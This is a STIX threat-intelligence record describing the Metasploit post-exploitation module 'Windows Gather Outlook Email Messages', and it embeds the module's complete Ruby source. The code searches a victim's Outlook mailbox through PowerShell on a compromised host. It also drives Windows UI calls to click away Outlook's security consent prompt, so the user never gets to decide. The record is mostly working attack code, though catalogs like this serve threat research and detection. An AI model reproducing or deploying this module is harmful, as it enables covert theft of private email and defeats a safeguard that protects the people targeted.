{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2dbd9580-3b3f-4bb0-a9cd-604548b2c73e",
    "created": "2024-08-14T16:33:05.059866Z",
    "modified": "2024-08-14T16:33:05.059881Z",
    "name": "Windows Gather Outlook Email Messages",
    "description": " This module allows reading and searching email messages from the local Outlook installation using PowerShell. Please note that this module is manipulating the victims keyboard/mouse.  If a victim is active on the target system, he may notice the activities of this module. Tested on Windows 8.1 x64 with Office 2013.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/outlook.rb",
            "external_id": "outlook.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://forsec.nl/2014/11/reading-outlook-using-metasploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Powershell\n\n  A_HASH = { 'en_US' => 'Allow', 'nl_NL' => 'Toestaan', 'de_DE' => 'Erteilen', 'de_AT' => 'Erteilen' }\n  ACF_HASH = { 'en_US' => 'Allow access for', 'nl_NL' => 'Toegang geven voor', 'de_DE' => \"Zugriff gew\\xc3\\xa4hren f\\xc3\\xbcr\", 'de_AT' => \"Zugriff gew\\xc3\\xa4hren f\\xc3\\xbcr\" }\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Outlook Email Messages',\n        'Description' => %q{\n          This module allows reading and searching email messages from the local\n          Outlook installation using PowerShell. Please note that this module is\n          manipulating the victims keyboard/mouse.  If a victim is active on the target\n          system, he may notice the activities of this module. Tested on Windows 8.1\n          x64 with Office 2013.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Wesley Neelen <security[at]forsec.nl>' ],\n        'References' => [ 'URL', 'https://forsec.nl/2014/11/reading-outlook-using-metasploit' ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'Lists all folders' } ],\n          [ 'SEARCH', { 'Description' => 'Searches for an email' } ]\n        ],\n        'DefaultAction' => 'LIST',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_sysinfo\n              stdapi_ui_get_idle_time\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FOLDER', [ false, 'The e-mailfolder to read (e.g. Inbox)' ]),\n        OptString.new('KEYWORD', [ false, 'Search e-mails by the keyword specified here' ]),\n        OptString.new('A_TRANSLATION', [ false, 'Fill in the translation of the word \"Allow\" in the targets system language, to click on the security popup.' ]),\n        OptString.new('ACF_TRANSLATION', [ false, 'Fill in the translation of the phrase \"Allow access for\" in the targets system language, to click on the security popup.' ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])\n      ]\n    )\n  end\n\n  def execute_outlook_script(command)\n    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'outlook.ps1'))\n    psh_script = base_script << command\n    compressed_script = compress_script(psh_script)\n    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])\n    while (d = cmd_out.channel.read)\n      print(d.to_s)\n    end\n    currentidle = session.ui.idle_time\n    vprint_status(\"System has currently been idle for #{currentidle} seconds\")\n  end\n\n  # This function prints a listing of available mailbox folders\n  def list_boxes\n    command = 'List-Folder'\n    execute_outlook_script(command)\n  end\n\n  # This functions reads Outlook using powershell scripts\n  def read_emails(folder, keyword, atrans, acftrans)\n    view = framework.threads.spawn('ButtonClicker', false) do\n      click_button(atrans, acftrans)\n    end\n    command = \"Get-Emails \\\"#{keyword}\\\" \\\"#{folder}\\\"\"\n    execute_outlook_script(command)\n  end\n\n  # This functions clicks on the security notification generated by Outlook.\n  def click_button(atrans, acftrans)\n    sleep 1\n    hwnd = client.railgun.user32.FindWindowW(nil, 'Microsoft Outlook')\n    if hwnd != 0\n      hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, 'Button', \"&#{acftrans}\")\n      client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)\n      client.railgun.user32.MoveWindow(hwnd['return'], 150, 150, 1, 1, true)\n      hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, 'Button', atrans.to_s)\n      client.railgun.user32.SetActiveWindow(hwndChild['return'])\n      client.railgun.user32.SetForegroundWindow(hwndChild['return'])\n      client.railgun.user32.SetCursorPos(150, 150)\n      client.railgun.user32.mouse_event(0x0002, 150, 150, nil, nil)\n      client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)\n    else\n      print_error('Error while clicking on the Outlook security notification. Window could not be found')\n    end\n  end\n\n  # Main method\n  def run\n    folder\t= datastore['FOLDER']\n    keyword = datastore['KEYWORD'].to_s\n    allow\t= datastore['A_TRANSLATION']\n    allow_access_for = datastore['ACF_TRANSLATION']\n    langNotSupported = true\n\n    # OS language check\n    sysLang = client.sys.config.sysinfo['System Language']\n    A_HASH.each do |key, _val|\n      next unless sysLang == key\n\n      langNotSupported = false\n      atrans = A_HASH[sysLang]\n      acftrans = ACF_HASH[sysLang]\n    end\n\n    if allow && allow_access_for\n      atrans = allow\n      acftrans = allow_access_for\n    elsif langNotSupported == true\n      fail_with(Failure::Unknown, 'System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)')\n    end\n\n    # Outlook installed\n    @key_base = 'HKCU\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\\\\9375CFF0413111d3B88A00104B2A6676'\n    outlookInstalled = registry_getvaldata(\"#{@key_base}\\\\\", 'NextAccountID')\n\n    if !outlookInstalled.nil?\n      if outlookInstalled != 0\n        print_good 'Outlook is installed'\n      else\n        fail_with(Failure::Unknown, 'Outlook is not installed')\n      end\n    end\n\n    # Powershell installed check\n    if have_powershell?\n      print_good('PowerShell is installed.')\n    else\n      fail_with(Failure::Unknown, 'PowerShell is not installed')\n    end\n\n    # Check whether target system is locked\n    locked = client.railgun.user32.GetForegroundWindow()['return']\n    if locked == 0\n      fail_with(Failure::Unknown, \"Target system is locked. This post module cannot click on Outlook's security warning when the target system is locked.\")\n    end\n\n    case action.name\n    when 'LIST'\n      print_good('Available folders in the mailbox: ')\n      list_boxes\n    when 'SEARCH'\n      read_emails(folder, keyword, atrans, acftrans)\n    else\n      print_error(\"Unknown Action: #{action.name}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}